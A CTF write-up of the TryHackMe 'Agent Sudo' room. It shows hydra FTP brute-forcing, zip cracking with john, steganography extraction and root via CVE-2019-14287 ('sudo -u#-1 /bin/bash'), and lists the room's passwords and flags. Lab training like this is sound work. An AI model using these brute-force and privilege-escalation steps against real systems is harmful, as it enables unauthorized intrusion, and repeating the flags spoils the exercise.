# Agent-Sudo
Detailed Writeup For The Tryhackme " Agent Sudo " An Easy Rated Machine That Covers Scanning, Enumeration , Bruteforcing , Hashing , Steghiding , OSINT , Linux PrivEsc

# Task 2 : Enumerate

`nmap -sC -sV <IP>`
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 17:10 +00
Nmap scan report for 10.10.77.128
Host is up (0.089s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.42 seconds
```

***How Many Ports Are Open ?***
`3`

***How you redirect yourself to a secret page?***
`user-agent`

In order to answer the third question we should check the website.

<!-- Here Goes The Website Screenshot -->

So , As We Can See There's Something Going With User-Agent Basing On Question 2, At The Bottom We Have
Agent R. We Can Conclude That The Agent's Are Alphabets. In This Case , Wen Need To Create A A-Z Wordlist And Bruteforce The User-Agent Until We Find The Right One.

**Generation Wordlist Using Crunch**
`crunch 1 1 ABCDEFGHIJKLMNOPQRSTUVWXYZ -o wordlist.txt`.

**Bruteforcing User-Agent With BurpSuite**
First Open The Website And Change THe Proxy Settings To Burp , And Turn On The Intercept
<!-- Screenshot 1 & 2 -->
Reload The Website And A Request Like This Should Popup , Click On Forward
<!-- Screenshot 3-->
Move To The HTTP History And Select The Request
<!-- ScreenShot 4 -->
Now Type On THe Keyboard `CTRL+I`
<!-- Screenshot 5 -->
Select Positions Tab And Highlight The User-Agent Value Then Hit THe `§ADD§` Button
<!-- Screenshot 6 -->
Select The Payloads Tab And Click Load Then Choose The Wordlist We've Created And Click Start Attack
<!-- Screenshot 7 -->
As We Can See In The Image Below , The User Agent Is "C" Because We Got A Different Status Code "302" Than The Other User Agents
<!-- Screenshot 8 -->
Now Close The Intruder And Go Back TO HTTP History , Select The Request And Hit `CTRL+R` To Send To The Repeater .
<!-- Screenshot 9 -->
Here Change The User Agent Value To "C" And Click Send
<!-- Screenshot 10 & 11 -->
Now Click The `Follow Redirection` Button , And We Got The Username `chris`
<!-- Screenshot 12 & 13 -->

***What is the agent name?***
`chris`

# Task 3 : Hash Cracking And Brute-Force 

Now We Have A Username `Chris` We Should Search For The FTP Password As Asked In The Question Number 1. We Can Use A Tool Called Hydra , Here I'm Using Rockyou Wordlist, You Can Choose Any Wordlist You Want.

`hydra -t 4 -l chris -P /usr/share/wordlists/rockyou.txt ftp://<IP>`

```
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-26 18:17:18
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ftp://10.10.77.128:21/
[STATUS] 68.00 tries/min, 68 tries in 00:01h, 14344331 to do in 3515:47h, 4 active
[STATUS] 66.33 tries/min, 199 tries in 00:03h, 14344200 to do in 3604:05h, 4 active
[21][ftp] host: 10.10.77.128   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-26 18:21:15
```

***FTP password***
`crystal`

Now We Can Connect With FTP And See What We Got There

`ftp <IP> 21`

The Name Is `Chris`
The Password Is `Crystal`

Use The Command `dir` To Show Available Files
```
229 Entering Extended Passive Mode (|||58018|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
```

Looks Like We Have 2 Images And A Text File . Let's Download Them All To Our Local Machine And See What We Can Do Using The Command `mget *` if an entry asked just type `y` And Hit `Enter`.Then Type `bye` To Close FTP.Let's Check First The Content Of The Text File.

`cat To_agentJ.txt`

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

On The Note Agent C Said That The Password Is Stored In The Fake Picture . Let's See What The Pictures Are Hiding.

Let's Use Strings To Check For Image String.

`strings cute-alien.jpg`

So Here We Got Nothing Just And Incomprehensible Text.

Let's See The Other Picture.

`strings cutie.png`

<!--Screenshot 14 -->

So Here We Got Something Interesting . Txt Files Inside Strings Let's Extract Them Using A Tool Called `Binwalk`

`binwalk -e cutie.png`
`ls -la`
```
total 100
drwxr-xr-x 3 anony anony  4096 Apr 26 18:35 .
drwxr-xr-x 7 anony anony  4096 Apr 26 17:02 ..
-rw-r--r-- 1 anony anony 33143 Oct 29  2019 cute-alien.jpg
-rw-r--r-- 1 anony anony 34842 Oct 29  2019 cutie.png
drwxr-xr-x 2 anony anony  4096 Apr 26 18:35 _cutie.png.extracted
-rw-r--r-- 1 anony anony   939 Apr 26 17:10 nmap_init.txt
-rw-r--r-- 1 anony anony   217 Oct 29  2019 To_agentJ.txt
-rw-r--r-- 1 anony anony    52 Apr 26 17:35 wordlist.txt
-rw-r--r-- 1 anony anony  2918 Apr 26 18:15 writeup.md

```
We Got A Directory Called `_cutie.png.extracted` Let's Jump Into IT. 

`cd _cutie.png.extracted`
`ls -la`
```
total 324
drwxr-xr-x 2 anony anony   4096 Apr 26 18:35 .
drwxr-xr-x 3 anony anony   4096 Apr 26 18:35 ..
-rw-r--r-- 1 anony anony 279312 Apr 26 18:35 365
-rw-r--r-- 1 anony anony  33973 Apr 26 18:35 365.zlib
-rw-r--r-- 1 anony anony    280 Apr 26 18:35 8702.zip
-rw-r--r-- 1 anony anony      0 Oct 29  2019 To_agentR.txt

```
We Got A Zip File, Let's Extract It Using The `unzip 8702.zip` Command.
```
Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)

```
Shit ! It's Protected By A Password Let's Crack Using `John` First Let's Turn It Into A John Readable Format USing `zip2john 8702.zip>output.txt` Then Let's Crack It Using `john --format=zip output.txt` Command.
```
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:01 DONE 2/3 (2022-04-26 18:41) 0.5586g/s 25402p/s 25402c/s 25402C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
We Got The Password `Alien`.

***ZIP password***
`alien`

Now Let's Unzip The Text File. First We Need To Install
7zip `sudo apt install p7zip-full` Then TYpe THis Command
`7za x -palien 8702.zip` Now We Have A Text File `To_agentR.txt` Let's Check It's Content `cat To_agentR.txt`
```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
We Got A Hash `QXJlYTUx` , Let's Use This Hash Analyzer To Find The Hash Type https://www.tunnelsup.com/hash-analyzer/

<!-- Screenshot 15 -->

So It's A Base64 Hash Let's Decode IT.
`echo "QXJlYTUx" | base64 -d`
```
Area51
```
It's `Area51`

***Steg Password***
`Area51`

Let's See What The Other Image Is Hiding Using An Online Steganography Tool https://futureboy.us/stegano/decinput.html Use `Area51` As The Password. We Got A Message 
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

***Who is the other agent (in full name)?***
`james`
***SSH password***
`hackerrules!`
Now We Have The User And The Password Let's Connect Via SSH.
`ssh james@<IP>`

# Task 4 : Capture The User Flag

Let's Get The User Flag
`ls -la`
```
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
```
`cat user_flag.txt`
```
b03d975e8c92a7c04146cfa7a5a313c7
```
***What is the user flag?***
`b03d975e8c92a7c04146cfa7a5a313c7`

We Got Also An Image Called Alien_autospy.jpg. Let's Download It.
Execute The Following Command On Your Local Machine `sudo scp james@<IP>:Alien_autospy.jpg ~/`
Now Let's Use Google Reverse Image Search. Open https://www.google.co.ma/imghp?hl=fr&ogbl And Follow The Screenshots
<!-- Screenshot 16 17 18 19 -->

Based On The Hint The Answer Is On Foxnews Website So Let's Change The Google Search Title

<!-- Screenshot 20 & 21-->

***What is the incident of the photo called?***
`Roswell alien autopsy`

# Task 5 : Priviliege Escalation

First Let's See What Commands We Can Run Using Sudo 

`sudo -l`
```
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

```
Let's Search `(ALL, !root)` On Google And Find An Exploit !

<!-- Screenshot 22 -->

***CVE number for the escalation (Format: CVE-xxxx-xxxx)***
`CVE-2019-14287`

Opening The First Website We Found An Exploit On exploit-db
Link : https://www.exploit-db.com/exploits/47502

So To Exploit It Just Type This On The Terminal `sudo -u#-1 /bin/bash`

And We Are Root !!!

To Reveal The Flag 

`cat /root/root.txt`

```
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R
```
***What is the root flag?***
`b53a02f55b57d4439e3341834d70c062`
***(Bonus) Who is Agent R?***
`Deskel`

Thanks For Reading !!!!!
